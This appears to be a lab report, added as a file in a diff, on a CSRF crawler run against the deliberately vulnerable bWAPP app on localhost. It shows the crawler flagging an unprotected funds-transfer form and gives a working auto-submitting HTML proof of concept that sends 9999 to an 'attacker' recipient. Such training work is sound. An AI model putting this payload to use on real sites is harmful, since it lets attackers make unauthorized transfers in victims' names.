@@ -1,0 +1,39 @@
+REPORT ON CSRF CRAWLER AND VULNERABILITY
+
+I have included the script and the PoC file in the repository.
+
+The output of the script was:
+[!] CSRF Token Missing at http://localhost/bWAPP/transfer_funds.php
+Form:
+<form action="transfer_funds.php" method="post">
+  <label>Amount:</label><input type="text" name="amount" />
+  <label>Recipient:</label><input type="text" name="recipient" />
+  <input type="submit" value="Transfer" />
+</form>
+
+What Does the Output Mean?
+The script flagged a form at http://localhost/bWAPP/transfer_funds.php as "CSRF Token Missing".
+This indicates that the form likely does not have any CSRF protection.
+
+How to Improve the Script
+The script currently looks for hidden inputs whose names contain "csrf".
+In some cases, the token might be called something different (e.g., "auth_token" or "nonce").
+To improve detection, update the script to look for these other keywords too.
+
+How to Build Your CSRF PoC HTML
+Because no CSRF token is present, you can simply create a form with the required fields and submit it automatically.
+
+Example:
+
+<form action="http://localhost/bWAPP/transfer_funds.php" method="POST" id="csrfForm">
+  <input type="hidden" name="amount" value="9999">
+  <input type="hidden" name="recipient" value="attacker">
+</form>
+
+<script>
+  document.getElementById('csrfForm').submit();
+</script>
+
+Summary
+The script successfully detected a form without CSRF protection.
+A PoC has been prepared to demonstrate an unauthorized fund transfer.
